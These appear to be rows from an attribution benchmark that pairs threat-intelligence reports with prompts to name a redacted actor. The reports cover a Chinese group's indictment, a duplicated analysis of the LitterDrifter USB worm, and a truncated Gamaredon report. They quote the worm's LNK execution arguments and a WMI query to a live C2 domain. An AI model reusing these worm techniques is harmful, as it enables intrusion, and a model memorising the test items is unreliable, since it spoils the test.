states     Senior presidential campaign staff members     Ambassador in a South-East Asian country     Political strategists     Retired national security official     43 UK parliament members     Defense     U.S. Naval Academy      U.S. Naval War College’s China Maritime Studies     Contractor designing flight simulators for the U.S. Navy and U.S. Air Force     Industry     American Steel Company     Various companies in the aerospace sector     Finance & Law     Multiple global law firms throughout the United States     Unspecified finance, management consulting and financial rating companies     IT & telco     7 Managed Services Providers     A leading provider of 5G equipment and a 5G integration service company     A voice technology company     A company specialized in multi-factor authentication (MFA)     An undisclosed editor of law-firm software     Likely one or more ISPs, based on the acquisition of call data records     Research     Laboratory specialized in machine learning     Various research hospitals and institutes     Civil Society     Various journalists, academics and policy experts     Democracy activists (in the U.S., Hong Kong)     Uyghur minority     Unspecified non-profit organization in Washington     Interparliamentary Alliance on China	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] is a long-standing Chinese-speaking threat actor. In the recent years, it garnered attention for:    Breaking into the network of the Finnish parliament in 2021;  Repurposing the “EpMe” 0day (CVE-2017-0005) captured from EquationGroup;  In late 2021, ANSSI reported on a large [PLACEHOLDER] campaign against French entities, and noted the uncharacteristic use of compromised SOHO routers as anonymization infrastructure;  Finally, in 2022, [PLACEHOLDER] launched a campaign against Russian media and energy companies, where it leveraged Yandex Cloud as a command and control (C2) infrastructure (as opposed to Dropbox for other campaigns in the West).  Overall, the group is a skilled threat actor, not known to handle cutting-edge 0-day exploits but still capable of devising creative homemade tooling.      THE PRIVATE-PUBLIC ECOSYSTEM  As evidenced in our in-depth review of the I-Soon leak, a significant part of the Chinese cyber-offense apparatus is composed of many small to medium companies conducting hacking operations for the benefit of the state. The [PLACEHOLDER] indictment features two such companies:    Wuhan Liuhe Tiangong Science & Technology Co., Ltd (“Wuhan Liuhe”), founded by one of the defendants;  Wuhan Xiaoruizhi Science & Technology Co., Ltd (“Wuhan XRZ”), a “front” for the Chinese MSS according to the U.S. DoJ.  Among the seven defendants, four are listed as contractors for Wuhan XRZ, one is the founder of Wuhan Liuhe, and the last two do not have an explicit affiliation. Wuhan XRZ is accused of being responsible of the hacking, while Wuhan Liuhe provided support. Beyond them, the indictment mentions “dozens” of MSS intelligence officers, hackers and support staff (identified by the DoJ but not named in the document) who contributed to the malicious activities.    The document is unclear on why Wuhan Liuhe is only considered to have provided support (and thus wasn’t sanctioned), since the one employee cited appears to have maintained victim lists, handled malware and deployed webshells. In any case, the frontier between contractors and intelligence community members appears extremely thin, as one Wuhan XRZ employee developed the RAWDOOR malware (as well as a keylogger and managed the associated infrastructure) while “co-located with an identified MSS officer”.      [PLACEHOLDER]’S TACTICS, TECHNIQUES AND PROCEDURES  [PLACEHOLDER] appears to have operated using a two-phase methodology, where victims would first receive an email supposedly coming from prominent US journalists. The emails contained legitimate news article excerpts, accompanied by tracking links – which we assume ultimately lead to the original article. Clicking them allowed attackers to obtain preliminary targeting information, such as the type of device on which the email was opened, as well as the public IP address of the recipient. Over 10,000 tracking emails were sent between June and September 2018 only[2].    The threat actor would then use the collected information to engage in direct hacking attempts of the victim’s devices based on this information (T1598.003). In particular, the indictment notes that [PLACEHOLDER] would actively target their victims’ family members, so they could go after home routers instead of better protected company networks. The observation that [PLACEHOLDER] focused on SOHO devices is consistent with ANSSI’s December 2021 report.    Tooling-wise, [PLACEHOLDER] initially used a number of malware families (RAWDOOR, Trochilus, EvilOSX, DropDoor/DropCat[3], etc.), all staged through DLL side-loading. Then the attackers switched to cracked versions of CobaltStrike, an infamous commercial penetration-testing tool. In one case, the U.S. DoJ explains the attackers compromised the subsidiary of a victim (a defense contractor manufacturing flight simulators for the military) before pivoting into the core network from there. The hack involved a local privilege escalation 0-day exploit (we assume CVE-2017-0005, mentioned previously) before exploiting an SQL injection.    While it seems [PLACEHOLDER] prefers server-side exploitation (where interactions with the victim are kept to a minimum) for these campaigns, other activities listed in the indictment (for instance, going after Hong Kong’s Umbrella Movement activists throughout 2019) show that the actor also relied on spearphishing emails containing malicious attachments or links. The defendants are also accused of creating fake Adobe Flash update pages to deploy the EvilOSX malware (T1036).    A final, less obvious detail contained in the indictment is the fact that [PLACEHOLDER] relied on double infections for at least some of the victims, allowing them to regain access to the network if the first malware implant was discovered.      ABOUT THE RAWDOOR MALWARE FAMILY  In the list of malware families contained in the indictment, we were not immediately able to associate RAWDOOR with a publicly documented malware strain – save for one mention in an archived transcript of a 2016 iSight report. We nonetheless identified a binary sample (SHA256 c3056e39f894ff73bba528faac04a1fc86deeec57641ad882000d7d40e5874be) which was first submitted in September 2015 to an online multi-scanner service, identified as “Rawdoor” by some security products, and “Warood” (a close anagram) by others.    A closer inspection of this malware sample turned out that it is a dropper, deploying either an x86 or x64 payload contained in its resources. The second stage is installed as a service, with uncharacteristic stealth compared to Chinese-speaking threat actor techniques documented for that era:    The installer inspects the contents of HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost\netsvcs and looks for an entry which doesn’t have a corresponding service in HKLM\SYSTEM\CurrentControlSet\Services\.  When one is found, it drops its payload as %WinDir%\Installer\~DF313.msi. The file is timestomped with the attributes of the system’s calc.exe file (T1070.006).  Then it creates the “missing” service with automatic startup, using the command line %SystemRoot%\system32\svchost.exe -k netsvcs. The installer edits the corresponding registry key manually to set the ServiceDll value to the dropped file.  Finally, the dropper starts the service, causing the second stage to load.  A summary analysis of the next stage by Microsoft can be found here. We would add to it that the sample we studied uses GitHub as a Command & Control channel[4] (hxxps://raw.githubusercontent[.]com/willbill4/workspaceer/master/9proxy5/ReadMe.txt). The corresponding GitHub repository (still online at the time of this writing) received 39 commits between August 5, 2015 and June 6, 2017. The Release folder contains additional binaries, such as a copy of RAWDOOR, likely for update purposes; a PlugX sample; penetration testing utilities such as “netcat”, and other unidentified malware samples.    Considering that samples of the Warood malware family use “RawDoor” as an internal name and in some logging messages, and that some of them contain traces of being compiled on machines in the Chinese language, we assess with high confidence that this malware family is the one referred to in the indictment. Corresponding indicators of compromise are listed in Appendix.      [PLACEHOLDER]’S FLEXIBILITY  The indictment notes that the threat actor could change targets extremely quickly, based on political events taking place in the world. It lists a few examples:    In the context of economic tensions between the U.S. and China, the United States implemented tariffs on imported steel. A day later, as China’s Ministry of Commerce promised a “major response”, [PLACEHOLDER] started registering infrastructure impersonating the American Steel Company, then shortly thereafter the International Steel Trade Forum. These domains were immediately used as C2 servers for malware deployed in the network of the American Steel Company.  Following the nomination of Hong Kong activists for the Nobel Peace Prize in 2018, [PLACEHOLDER] went after the Norwegian government as well as a major Norwegian Managed Services Provider (MSP).  Mid-July 2020, shortly after negative comments from the U.S. administration about China’s territorial claims in the South China Sea, [PLACEHOLDER] initiated a spearphishing campaign targeting the U.S. Navy and organizations or think tanks related to it.    ASSESSMENT  This indictment contains information consistent with pre-existing knowledge on both [PLACEHOLDER] tradecraft, and the nature of the cooperation between public and private Chinese entities on cyber-offense matters. While the U.S. opted not to indict members of the MSS (or if it did, chose not to identify them as such), it is obvious from reading the document that it considers private contractors as intelligence community members.    [PLACEHOLDER] has targeted (and in many cases, successfully breached) many high-profile entities in the Western world. The indictment provides a comprehensive view of the group’s interests, ranging from diplomatic intelligence to the theft of trade secrets and even financial data (see full list in appendix). In addition, the U.S. DoJ indicates that the call data records for “millions of Americans” have been acquired by the attackers, which hints at the compromission of at least one telecommunications provider in the country.    It is certain that [PLACEHOLDER] is responsible for many more campaigns outside of the United States, not covered by this indictment – particularly in Europe.      APPENDIX:    Victimology   The following list contains verticals and (where applicable) entities referred to in the indictment. The organizations mentioned were targeted by [PLACEHOLDER], but it is not possible to determine which of them were successfully breached from the DoJ’s information.     Government     White House     Department of Justice (including spouses of high-ranking officials)     Department of Commerce     Department of Labor     Department of Transportation     Department of Treasury     Department of State     Congress members from both parties     Senators from over 10 states     Senior presidential campaign staff members     Ambassador in a South-East Asian country     Political strategists     Retired national security official     43 UK parliament members     Defense     U.S. Naval Academy      U.S. Naval War College’s China Maritime Studies     Contractor designing flight simulators for the U.S. Navy and U.S. Air Force     Industry     American Steel Company     Various companies in the aerospace sector     Finance & Law     Multiple global law firms throughout the United States     Unspecified finance, management consulting and financial rating companies     IT & telco     7 Managed Services Providers     A leading provider of 5G equipment and a 5G integration service company     A voice technology company     A company specialized in multi-factor authentication (MFA)     An undisclosed editor of law-firm software     Likely one or more ISPs, based on the acquisition of call data records     Research     Laboratory specialized in machine learning     Various research hospitals and institutes     Civil Society     Various journalists, academics and policy experts     Democracy activists (in the U.S., Hong Kong)     Uyghur minority     Unspecified non-profit organization in Washington     Interparliamentary Alliance on China
https://research.checkpoint.com/2023/malware-spotlight-into-the-trash-analyzing-litterdrifter/	[PLACEHOLDER] is a unique player in the Russian espionage ecosystem that targets a wide variety of almost exclusively Ukrainian entities. While researchers often struggle to uncover evidence of Russian espionage activities, [PLACEHOLDER] is notably conspicuous. The group behind it conducts large-scale campaigns while still primarily focusing on regional targets. The Security Service of Ukraine (SSU) identified the [PLACEHOLDER] personnel as Russian Federal Security Service (FSB) officers.    [PLACEHOLDER]’s large-scale campaigns are usually followed by data collection efforts aimed at specific targets, whose selection is likely motivated by espionage goals. These efforts run parallel to the deployment of various mechanisms and tools designed to maintain as much access to these targets as possible. One such tool is a USB propagating worm that we have named LitterDrifter.    The LitterDrifter worm is written in VBS and has two main functionalities: automatic spreading over USB drives, and communication with a broad, flexible set of command-and-control servers. These features are implemented in a manner that aligns with the group’s goals, effectively maintaining a persistent command and control (C2) channel across a wide array of targets. LitterDrifter seems to be an evolution of a previously reported activity tying [PLACEHOLDER] group to a propagating USB Powershell worm.    In this report, we take an extensive dumpster dive into the analysis of [PLACEHOLDER]’s LitterDrifter malware, as well as its C2 infrastructure.    Key Points  [PLACEHOLDER] continues to focus on wide variety Ukrainian targets, but due to the nature of the USB worm, we see indications of possible infection in various countries like USA, Vietnam, Chile, Poland and Germany. In addition, we’ve observed evidence of infections in Hong Kong. All this might indicate that much like other USB worms, LitterDrifter have spread beyond its intended targets.    Figure 1 – Virus Total Submissions of LitterDrifter    The group recently started deploying LitterDrifter, a worm written in VBS, designed to propagate through removable USB drives and secure a C2 channel.  [PLACEHOLDER]’s infrastructure remains extremely flexible and volatile, while at the same time maintaining previously reported characteristics and patterns.  LitterDrifter Overview  The LitterDrifter is a self-propagating worm with two main functionalities: spreading over drives and establishing a C2 channel to [PLACEHOLDER]’s wide command and control infrastructure. Those two functionalities reside within an orchestration component saved to disk as “trash.dll”, which is actually a VBS, despite its file extension name.    Figure 2 - A high-level execution scheme of LitterDrifter.  Figure 2 – A high-level execution scheme of LitterDrifter.  trash.dll, as the initial orchestration component, runs first and its main function is to decode and execute the other modules and maintain initial persistence in the victim’s environment.    Following a successful execution, it runs the two extracted modules:    1. Spreader module – Distributes the malware in the system and potentially spreads it to other environments by prioritizing infection of a logical disk with mediatype=NULL, usually associated with USB removable media.    2. C2 Module – Retrieves a command and control server IP address by generating a random subdomain of a built-in C2 server, while also maintaining a backup option to retrieve a C2 IP address from a Telegram channel. Its main purpose is to establish communication with the attacker C&C server and to execute incoming payloads.    Dumpster Diving  Deobfuscoding the DEOBFUSCODER  The orchestration component (referred to as DEOBFUSCODER) is heavily obfuscated and is constructed from a series of strings with character substitution obfuscation. It consists of 7 functions and variables with name mangling. Throughout the run of the “Deobfucate” action, LitterDrifter invokes a function that delays the execution for a few seconds (the exact time varies from sample to sample) to delay the following actions.    The main function takes two encoded strings (the other two malicious components) as parameters. It then declares two paths under the user’s “Favorites” directory, designed to store the two decoded scripts from the other 2 encoded components of the VBS.  To ensure its persistence, the Deobfuscoder makes a copy of the original script to a hidden file called “trash.dll” in the user’s directory.  The script decodes the provided encoded strings and writes them to the “Favorites” directory as “jersey.webm”, the payload component, and “jaw.wm”, the spreader component (the names and extensions of the files and also the location inside the %userprofile% differ between variants).  After creating these files, the malware proceeds to set scheduled tasks for each of the 2 components, ensuring they are regularly executed. In addition, it adds an entry to the user’s startup items in the Registry Run Keys to ensure they run upon startup.  Both the tasks and the startup entries are disguised using technical-sounding names such as “RunFullMemoryDiagnostic” and “ProcessMemoryDiagnosticEvents” to appear legitimate and avoid arousing suspicion.  Figure 3 - Deobfuscated snippet of the orchestrator DEOBFUSCODER’s  Main Function.  Figure 3 – Deobfuscated snippet of the orchestrator DEOBFUSCODER’s Main Function.  The entire flow is deliberately obscured by ambiguous function and variable names as well as the use of inline scripting, which make it difficult for casual observers to discern its intent and activities.    Spreader Module Analysis  The core essence of the Spreader module lies in recursively accessing subfolders in each drive and creating LNK decoy shortcuts, alongside a hidden copy of the “trash.dll” file.    Figure 4 - trash.dll is distributed as a hidden file in a USB drive  together with a decoy LNK.  Figure 4 – trash.dll is distributed as a hidden file in a USB drive together with a decoy LNK.  Upon execution, the module queries the computer’s logical drives using Windows Management Instrumentation (WMI), and searches for logical disks with the MediaType value set to null, a method often used to identify removable USB drives.    Figure 5 - LitterDrifter’s spreader component.  Figure 5 – LitterDrifter’s spreader component.  For each logical drive detected, the spreader invokes the createShortcutsInSubfolders function. Within this function, it iterates the subfolders of a provided folder up to a depth of 2.    For every subfolder, it employs the CreateShortcut function as part of the “Create LNK” action, which is responsible for generating a shortcut with specific attributes. These shortcuts are LNK files that are given random names chosen from an array in the code. This is an example of the lure’s names from an array in one of the samples that we investigated:("Bank_accоunt", "постановa", "Bank_accоunt", "службовa", "cоmpromising_evidence"). The LNK files use wscript.exe **** to execute “trash.dll” with specified arguments " ""trash.dll"" /webm //e:vbScript //b /wm /cal ". In addition to generating the shortcut, the function also creates a hidden copy of “trash.dll” in the subfolder.    Figure 6 - A function in the Spreader component used to iterate  subfolders.  Figure 6 – A function in the Spreader component used to iterate subfolders.  C2 Module Analysis – Taking Out the Trash  [PLACEHOLDER]’s approach towards the C&C is rather unique, as it utilizes domains as a placeholder for the circulating IP addresses actually used as C2 servers.    Before attempting to contact a C2 server, the script checks the %TEMP% folder for an existing C2 configuration file with a meaningless name that’s hardcoded in the malware. This mechanism acts as a self-check for the malware, verifying whether it already infected the machine. If present, the current execution could simply be a scheduled execution triggered by the persistence mechanisms discussed earlier. If there isn’t an existing config file, the malware switches gears and pings one of [PLACEHOLDER]’s domains using a WMI query: select * from win32_pingstatus where address='Write<random_2_digit_number>.ozaharso.ru’. The malware extracts the IP resolution for the domain from the response to the query and saves it to a new configuration file.    Figure 7 - LitterDrifter retrieving the C2 IP address using a WMI  query.  Figure 7 – LitterDrifter retrieving the C2 IP address using a WMI query.  With the IP address in hand, LitterDrifter constructs the IP into a URL. The format is usually along the lines of http://<cncIP>/jaw<random_2_digit_number>/index.html=?<random_2_digit_number>. The C2 communication is carried out using a custom user-agent that contains some information about the machine. This information includes the computer name and a hexadecimal form of the %systemdrive%’s serial number.    The end result is a user-agent that looks like this: mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/88.0.4324.152 yabrowser/21.2.3.106 yowser/2.5 safari/537.36;;<computer_name>_<system_drive_serial>;;/.justly/.    Figure 8 - LitterDrifter prepares the HTTP request, constructing the  URL and user-agent.  Figure 8 – LitterDrifter prepares the HTTP request, constructing the URL and user-agent.  The request’s HTTP header is also carefully tailored. For example, in one of the samples we found, the Referer field discreetly holds https://www.crimea.kp.ru/daily/euromaidan/, a nod to Crimea’s news site. It also sneaks in some specifics for the Accept-Language and the string marketCookie in the Cookie field.    Figure 9 - HTTP request function.  Figure 9 – HTTP request function.  LitterDrifter utilizes a fail counter to choose which C2 method is relevant. The fail counter increases each time the C2 fails to return either a payload or a Telegram backup channel, from which LitterDrifter extracts an alternative C2. The flow of the code suggests the first answer to return is usually a Telegram channel ID, which is saved in a backup file.    Based on the fail count, LitterDrifter chooses to which C2 to connect:    If the fail counter is currently set to 0, the request is carried out to the file saved in the configuration file.  If the fail counter is currently set to 1, LitterDrifter attempts to resolve its embedded C2 domain using a WMI Query, as previously described.  If the fail counter is set to 2, LitterDrifter attempts to connect to a C2 extracted from a Telegram backup channel, using a different user-agent and a Referer of https://www.interfax.ru/tags/, which is another Russian news site. From there, it extracts an IP address used as a C2.  Figure 10 - [PLACEHOLDER]’s Telegram channel that conceals a C&C IP  address.  Figure 10 – [PLACEHOLDER]’s Telegram channel that conceals a C&C IP address.  If a payload is found within the C2 reply, LitterDrifter tries to decode it. It unwraps any base64 content and attempts to run the decoded data. Based on our analysis, the payload is not downloaded to most targets.    Figure 11 - LitterDrifter’s fail count options and execution of a  received payload (Deobfuscated).  Figure 11 – LitterDrifter’s fail count options and execution of a received payload (Deobfuscated).  Infrastructure  During our analysis, we noticed distinct patterns in the infrastructure employed by [PLACEHOLDER] in this operation. This includes registration patterns, as all of the domains used by [PLACEHOLDER]’s LitterDrifter are registered by REGRU-RU. and are part of the TLD .ru. These findings align with other past reports of [PLACEHOLDER]’s infrastructure.    Based on some of the patterns, we were able to associate specific domains and subdomains with LitterDriffter’s operation, and other domains that are linked to other clusters of [PLACEHOLDER]’s activity.    In the LitterDrifter campaign, the C2 module gets the resolution for a [PLACEHOLDER]-owned domain through a WMI query. It does so by generating a random subdomain of a hardcoded domain, using random words and digits so each domain exhibits a diverse range of associated subdomains. Some domains have just a few subdomains, while others have several hundred. The following charts show the number of subdomains for each of the domains we encountered:    Figure 12 - Number of subdomains per domain.  Figure 12 – Number of subdomains per domain.  As we described earlier, the WMI query to [PLACEHOLDER]’s domain returns an IP address that is used as the operational C2 of the campaign. On average, an IP address remains operational for roughly 28 hours. However, the IP address serving as the active C2 usually changes several times a day (all of the IP addresses used might fall within the same subnet), as seen below:    Figure 13 - Number of C&C IP addresses per day in the past 2  months.  Figure 13 – Number of C&C IP addresses per day in the past 2 months.  Conclusion  In this report, we explored the inner workings of this recently identified worm. Comprised of two primary components – a spreading module and a C2 module – it’s clear that LitterDrifter was designed to support a large-scale collection operation. It leverages simple, yet effective techniques to ensure it can reach the widest possible set of targets in the region.    LitterDrifter doesn’t rely on groundbreaking techniques and may appear to be a relatively unsophisticated piece of malware. However, this same simplicity is in line with its goals, mirroring [PLACEHOLDER]’s overall approach. This method has demonstrated considerable effectiveness, as evidenced by the group’s sustained activities in Ukraine.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] is a unique player in the Russian espionage ecosystem that targets a wide variety of almost exclusively Ukrainian entities. While researchers often struggle to uncover evidence of Russian espionage activities, [PLACEHOLDER] is notably conspicuous. The group behind it conducts large-scale campaigns while still primarily focusing on regional targets. The Security Service of Ukraine (SSU) identified the [PLACEHOLDER] personnel as Russian Federal Security Service (FSB) officers.    [PLACEHOLDER]’s large-scale campaigns are usually followed by data collection efforts aimed at specific targets, whose selection is likely motivated by espionage goals. These efforts run parallel to the deployment of various mechanisms and tools designed to maintain as much access to these targets as possible. One such tool is a USB propagating worm that we have named LitterDrifter.    The LitterDrifter worm is written in VBS and has two main functionalities: automatic spreading over USB drives, and communication with a broad, flexible set of command-and-control servers. These features are implemented in a manner that aligns with the group’s goals, effectively maintaining a persistent command and control (C2) channel across a wide array of targets. LitterDrifter seems to be an evolution of a previously reported activity tying [PLACEHOLDER] group to a propagating USB Powershell worm.    In this report, we take an extensive dumpster dive into the analysis of [PLACEHOLDER]’s LitterDrifter malware, as well as its C2 infrastructure.    Key Points  [PLACEHOLDER] continues to focus on wide variety Ukrainian targets, but due to the nature of the USB worm, we see indications of possible infection in various countries like USA, Vietnam, Chile, Poland and Germany. In addition, we’ve observed evidence of infections in Hong Kong. All this might indicate that much like other USB worms, LitterDrifter have spread beyond its intended targets.    Figure 1 – Virus Total Submissions of LitterDrifter    The group recently started deploying LitterDrifter, a worm written in VBS, designed to propagate through removable USB drives and secure a C2 channel.  [PLACEHOLDER]’s infrastructure remains extremely flexible and volatile, while at the same time maintaining previously reported characteristics and patterns.  LitterDrifter Overview  The LitterDrifter is a self-propagating worm with two main functionalities: spreading over drives and establishing a C2 channel to [PLACEHOLDER]’s wide command and control infrastructure. Those two functionalities reside within an orchestration component saved to disk as “trash.dll”, which is actually a VBS, despite its file extension name.    Figure 2 - A high-level execution scheme of LitterDrifter.  Figure 2 – A high-level execution scheme of LitterDrifter.  trash.dll, as the initial orchestration component, runs first and its main function is to decode and execute the other modules and maintain initial persistence in the victim’s environment.    Following a successful execution, it runs the two extracted modules:    1. Spreader module – Distributes the malware in the system and potentially spreads it to other environments by prioritizing infection of a logical disk with mediatype=NULL, usually associated with USB removable media.    2. C2 Module – Retrieves a command and control server IP address by generating a random subdomain of a built-in C2 server, while also maintaining a backup option to retrieve a C2 IP address from a Telegram channel. Its main purpose is to establish communication with the attacker C&C server and to execute incoming payloads.    Dumpster Diving  Deobfuscoding the DEOBFUSCODER  The orchestration component (referred to as DEOBFUSCODER) is heavily obfuscated and is constructed from a series of strings with character substitution obfuscation. It consists of 7 functions and variables with name mangling. Throughout the run of the “Deobfucate” action, LitterDrifter invokes a function that delays the execution for a few seconds (the exact time varies from sample to sample) to delay the following actions.    The main function takes two encoded strings (the other two malicious components) as parameters. It then declares two paths under the user’s “Favorites” directory, designed to store the two decoded scripts from the other 2 encoded components of the VBS.  To ensure its persistence, the Deobfuscoder makes a copy of the original script to a hidden file called “trash.dll” in the user’s directory.  The script decodes the provided encoded strings and writes them to the “Favorites” directory as “jersey.webm”, the payload component, and “jaw.wm”, the spreader component (the names and extensions of the files and also the location inside the %userprofile% differ between variants).  After creating these files, the malware proceeds to set scheduled tasks for each of the 2 components, ensuring they are regularly executed. In addition, it adds an entry to the user’s startup items in the Registry Run Keys to ensure they run upon startup.  Both the tasks and the startup entries are disguised using technical-sounding names such as “RunFullMemoryDiagnostic” and “ProcessMemoryDiagnosticEvents” to appear legitimate and avoid arousing suspicion.  Figure 3 - Deobfuscated snippet of the orchestrator DEOBFUSCODER’s  Main Function.  Figure 3 – Deobfuscated snippet of the orchestrator DEOBFUSCODER’s Main Function.  The entire flow is deliberately obscured by ambiguous function and variable names as well as the use of inline scripting, which make it difficult for casual observers to discern its intent and activities.    Spreader Module Analysis  The core essence of the Spreader module lies in recursively accessing subfolders in each drive and creating LNK decoy shortcuts, alongside a hidden copy of the “trash.dll” file.    Figure 4 - trash.dll is distributed as a hidden file in a USB drive  together with a decoy LNK.  Figure 4 – trash.dll is distributed as a hidden file in a USB drive together with a decoy LNK.  Upon execution, the module queries the computer’s logical drives using Windows Management Instrumentation (WMI), and searches for logical disks with the MediaType value set to null, a method often used to identify removable USB drives.    Figure 5 - LitterDrifter’s spreader component.  Figure 5 – LitterDrifter’s spreader component.  For each logical drive detected, the spreader invokes the createShortcutsInSubfolders function. Within this function, it iterates the subfolders of a provided folder up to a depth of 2.    For every subfolder, it employs the CreateShortcut function as part of the “Create LNK” action, which is responsible for generating a shortcut with specific attributes. These shortcuts are LNK files that are given random names chosen from an array in the code. This is an example of the lure’s names from an array in one of the samples that we investigated:("Bank_accоunt", "постановa", "Bank_accоunt", "службовa", "cоmpromising_evidence"). The LNK files use wscript.exe **** to execute “trash.dll” with specified arguments " ""trash.dll"" /webm //e:vbScript //b /wm /cal ". In addition to generating the shortcut, the function also creates a hidden copy of “trash.dll” in the subfolder.    Figure 6 - A function in the Spreader component used to iterate  subfolders.  Figure 6 – A function in the Spreader component used to iterate subfolders.  C2 Module Analysis – Taking Out the Trash  [PLACEHOLDER]’s approach towards the C&C is rather unique, as it utilizes domains as a placeholder for the circulating IP addresses actually used as C2 servers.    Before attempting to contact a C2 server, the script checks the %TEMP% folder for an existing C2 configuration file with a meaningless name that’s hardcoded in the malware. This mechanism acts as a self-check for the malware, verifying whether it already infected the machine. If present, the current execution could simply be a scheduled execution triggered by the persistence mechanisms discussed earlier. If there isn’t an existing config file, the malware switches gears and pings one of [PLACEHOLDER]’s domains using a WMI query: select * from win32_pingstatus where address='Write<random_2_digit_number>.ozaharso.ru’. The malware extracts the IP resolution for the domain from the response to the query and saves it to a new configuration file.    Figure 7 - LitterDrifter retrieving the C2 IP address using a WMI  query.  Figure 7 – LitterDrifter retrieving the C2 IP address using a WMI query.  With the IP address in hand, LitterDrifter constructs the IP into a URL. The format is usually along the lines of http://<cncIP>/jaw<random_2_digit_number>/index.html=?<random_2_digit_number>. The C2 communication is carried out using a custom user-agent that contains some information about the machine. This information includes the computer name and a hexadecimal form of the %systemdrive%’s serial number.    The end result is a user-agent that looks like this: mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/88.0.4324.152 yabrowser/21.2.3.106 yowser/2.5 safari/537.36;;<computer_name>_<system_drive_serial>;;/.justly/.    Figure 8 - LitterDrifter prepares the HTTP request, constructing the  URL and user-agent.  Figure 8 – LitterDrifter prepares the HTTP request, constructing the URL and user-agent.  The request’s HTTP header is also carefully tailored. For example, in one of the samples we found, the Referer field discreetly holds https://www.crimea.kp.ru/daily/euromaidan/, a nod to Crimea’s news site. It also sneaks in some specifics for the Accept-Language and the string marketCookie in the Cookie field.    Figure 9 - HTTP request function.  Figure 9 – HTTP request function.  LitterDrifter utilizes a fail counter to choose which C2 method is relevant. The fail counter increases each time the C2 fails to return either a payload or a Telegram backup channel, from which LitterDrifter extracts an alternative C2. The flow of the code suggests the first answer to return is usually a Telegram channel ID, which is saved in a backup file.    Based on the fail count, LitterDrifter chooses to which C2 to connect:    If the fail counter is currently set to 0, the request is carried out to the file saved in the configuration file.  If the fail counter is currently set to 1, LitterDrifter attempts to resolve its embedded C2 domain using a WMI Query, as previously described.  If the fail counter is set to 2, LitterDrifter attempts to connect to a C2 extracted from a Telegram backup channel, using a different user-agent and a Referer of https://www.interfax.ru/tags/, which is another Russian news site. From there, it extracts an IP address used as a C2.  Figure 10 - [PLACEHOLDER]’s Telegram channel that conceals a C&C IP  address.  Figure 10 – [PLACEHOLDER]’s Telegram channel that conceals a C&C IP address.  If a payload is found within the C2 reply, LitterDrifter tries to decode it. It unwraps any base64 content and attempts to run the decoded data. Based on our analysis, the payload is not downloaded to most targets.    Figure 11 - LitterDrifter’s fail count options and execution of a  received payload (Deobfuscated).  Figure 11 – LitterDrifter’s fail count options and execution of a received payload (Deobfuscated).  Infrastructure  During our analysis, we noticed distinct patterns in the infrastructure employed by [PLACEHOLDER] in this operation. This includes registration patterns, as all of the domains used by [PLACEHOLDER]’s LitterDrifter are registered by REGRU-RU. and are part of the TLD .ru. These findings align with other past reports of [PLACEHOLDER]’s infrastructure.    Based on some of the patterns, we were able to associate specific domains and subdomains with LitterDriffter’s operation, and other domains that are linked to other clusters of [PLACEHOLDER]’s activity.    In the LitterDrifter campaign, the C2 module gets the resolution for a [PLACEHOLDER]-owned domain through a WMI query. It does so by generating a random subdomain of a hardcoded domain, using random words and digits so each domain exhibits a diverse range of associated subdomains. Some domains have just a few subdomains, while others have several hundred. The following charts show the number of subdomains for each of the domains we encountered:    Figure 12 - Number of subdomains per domain.  Figure 12 – Number of subdomains per domain.  As we described earlier, the WMI query to [PLACEHOLDER]’s domain returns an IP address that is used as the operational C2 of the campaign. On average, an IP address remains operational for roughly 28 hours. However, the IP address serving as the active C2 usually changes several times a day (all of the IP addresses used might fall within the same subnet), as seen below:    Figure 13 - Number of C&C IP addresses per day in the past 2  months.  Figure 13 – Number of C&C IP addresses per day in the past 2 months.  Conclusion  In this report, we explored the inner workings of this recently identified worm. Comprised of two primary components – a spreading module and a C2 module – it’s clear that LitterDrifter was designed to support a large-scale collection operation. It leverages simple, yet effective techniques to ensure it can reach the widest possible set of targets in the region.    LitterDrifter doesn’t rely on groundbreaking techniques and may appear to be a relatively unsophisticated piece of malware. However, this same simplicity is in line with its goals, mirroring [PLACEHOLDER]’s overall approach. This method has demonstrated considerable effectiveness, as evidenced by the group’s sustained activities in Ukraine.
https://blogs.blackberry.com/en/2023/01/gamaredon-abuses-telegram-to-target-ukrainian-organizations	The [PLACEHOLDER] has been actively targeting the Ukrainian government lately, relying on the infrastructure of the popular messaging service Telegram to bypass traditional network traffic detection techniques without raising obvious flags. Back in November 2022, BlackBerry uncovered a new [PLACEHOLDER]campaign that relied on a multi-stage Telegram scheme to first profile potential victims, and then deliver the final payload along with the malicious command-and-control (C2).    This report provides information about the recent network infrastructure from Crimea that the [PLACEHOLDER] uses, as well as analysis of each step before the victims receive the final payload.    MITRE ATT&CK Information  Tactic    Technique    Execution    T1559.001, T1059.001, T1204.002, T1059.005    Persistence    T1547.001    Defense Evasion    T1027, T1221, T1036, T1140    Command and Control    T1102.002, T1105, T1571, T1008, T1071.001, T1573.001    Exfiltration    T1029         Weaponization and Technical Overview  Weapons    Obfuscated macro and PowerShell scripts, PE executables    Attack Vector    Spear-phishing, targeted maldocs    Network Infrastructure    DDNS, Telegram    Targets    Government organizations in Ukraine         Technical Analysis  Context    The [PLACEHOLDER] is a Russian state-sponsored cyber espionage group that has been active since 2013. Over the years, Gamaredon’s main target has always been Ukrainian government organizations. To bypass the government’s security measures, the threat group works continually to improve their malicious code over time.    In mid-September 2022, Talos Intelligence reported Gamaredon’s latest attack on Ukrainian government organizations and exposed details of the complete execution chain. In November 2022, the BlackBerry Research and Intelligence Team uncovered Gamaredon’s latest campaign, which relied on Telegram for malicious network structure purposes.    The initial infection vector we reported on was weaponized documents written in both the Russian and Ukrainian languages and sent via spear-phishing techniques, exploiting the remote template injection vulnerability that enables attackers to bypass Microsoft Word macro protections to compromise target systems with malware, gain access to information, then spread the infection to other users.    The 